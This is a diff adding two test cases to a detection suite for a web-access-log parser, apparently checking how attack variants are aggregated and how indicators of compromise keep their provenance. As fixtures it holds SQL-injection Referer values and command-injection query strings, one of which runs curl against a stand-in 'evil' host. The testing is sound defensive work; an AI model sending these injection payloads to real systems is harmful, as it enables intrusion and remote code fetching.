@@ -456,6 +456,35 @@ describe("parseCombinedLog — attack-variant bound per path", () => {
     expect(overflow.description).toMatch(/^\[web-attack: cmd,expression@ua,sqli@referer\] \[overflow:/);
   });
 
+  it("keeps IOC provenance pointing at the overflow row, not at a key that no longer exists", () => {
+    // The attack and the IOC both ride in the Referer: its host is a domain IOC, its query fires sqli.
+    const rows = Array.from({ length: 100 }, (_, i) =>
+      line("/index.php", `https://evil${i}.example.invalid/?id=1%27%20or%20${i}%3D${i}--`),
+    ).join("\n");
+    const r = parseCombinedLog(rows, { maxEvents: 5000 });
+    const overflow = r.events.find((e) => e.description.includes("[overflow:"))!;
+    // A domain IOC from an overflowed row (i >= 64) is attributed to the overflow row's key, which
+    // resolveExtractedFrom can match — the original key no longer names any event.
+    const late = r.iocs.find((i) => i.value === "evil90.example.invalid")!;
+    expect(late.sourceAggKeys).toEqual([overflow.aggKey]);
+    const early = r.iocs.find((i) => i.value === "evil3.example.invalid")!;
+    expect(early.sourceAggKeys).not.toEqual([overflow.aggKey]);
+  });
+
+  it("does not fold variants when aggregation is off — every payload stays its own row", () => {
+    const r = parseCombinedLog(
+      distinct(66, (i) => `/index.php?cmd=%3Bcurl%20http://evil/${i}`),
+      {
+        aggregate: false,
+        maxEvents: 5000,
+      },
+    );
+    expect(r.events).toHaveLength(66);
+    expect(
+      r.events.every((e) => e.description.includes("[match:") && !e.description.includes("[overflow:")),
+    ).toBe(true);
+  });
+
   it("bounds per path, not globally — a thousand paths are a thousand rows", () => {
     const r = parseCombinedLog(
       distinct(1000, (i) => `/p${i}?cmd=%3Bid`),
